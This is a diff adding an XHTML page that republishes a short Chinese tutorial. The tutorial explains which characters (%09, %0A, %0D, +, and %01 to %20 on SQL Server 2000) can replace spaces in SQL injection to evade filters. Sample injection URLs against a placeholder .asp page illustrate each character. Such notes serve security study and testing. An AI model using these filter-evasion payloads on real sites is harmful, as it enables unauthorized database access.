@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>SQL注入中可以替换空格的字符</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>SQL注入中可以替换空格的字符</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247484131&amp;idx=1&amp;sn=e6056f96d0875281e29cf91684f651f4&amp;chksm=eb6687e0dc110ef6033fb46f84184f3153830cdcd3c2676e15f28a6ee89ebf475fcc6d5031ae&amp;scene=126&amp;sessionid=1681407355#rd">http://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247484131&amp;idx=1&amp;sn=e6056f96d0875281e29cf91684f651f4&amp;chksm=eb6687e0dc110ef6033fb46f84184f3153830cdcd3c2676e15f28a6ee89ebf475fcc6d5031ae&amp;scene=126&amp;sessionid=1681407355#rd</a></blockquote><p style=" box-sizing: border-box; margin-bottom: 18px; word-wrap: break-word; color: rgb(85, 85, 85) ; ;; font-size: 15px; white-space: normal; background-color: rgb(255, 255, 255); ">默认是：<br style="box-sizing: border-box;"/><a class="keylink" target="_blank" style="box-sizing: border-box; background: 0px 0px; color: rgb(30, 115, 190); text-decoration: underline; transition: all 0.25s;">asp</a>?id=78″&gt;http://www.xxx.com/shownotice.asp?id=78 and 1=1<br style="box-sizing: border-box;"/>实际上用%09  %0A  %0D  +都可以替代空格<br style="box-sizing: border-box;"/>例如：<br style="box-sizing: border-box;"/><a style="box-sizing: border-box; background: 0px 0px; color: rgb(30, 115, 190); text-decoration: underline; transition: all 0.25s;">http://www.xxx.com/shownotice.asp?id=78%09and%091=1</a><br style="box-sizing: border-box;"/><a style="box-sizing: border-box; background: 0px 0px; color: rgb(30, 115, 190); text-decoration: underline; transition: all 0.25s;">http://www.xxx.com/shownotice.asp?id=78%0Aand%0A1=1</a><br style="box-sizing: border-box;"/><a style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 94, 82); text-decoration: underline; transition: all 0.25s; outline: 0px;">http://www.xxx.com/shownotice.asp?id=78%0Dand%0D1=1</a><br style="box-sizing: border-box;"/><a style="box-sizing: border-box; background: 0px 0px; color: rgb(30, 115, 190); text-decoration: underline; transition: all 0.25s;">http://www.xxx.com/shownotice.asp?id=78%+and+1=1</a></p><p style=" box-sizing: border-box; margin-bottom: 18px; word-wrap: break-word; color: rgb(85, 85, 85) ; ;; font-size: 15px; white-space: normal; background-color: rgb(255, 255, 255); ">以下可以在SQLServer2000下可以替换%01到%20都可以<br style="box-sizing: border-box;"/><a style="box-sizing: border-box; background: 0px 0px; color: rgb(30, 115, 190); text-decoration: underline; transition: all 0.25s;">http://www.xxx.com/shownotice.asp?id=78%19and%191=1</a></p><p><br/></p>
+        
+</body>
+</html>
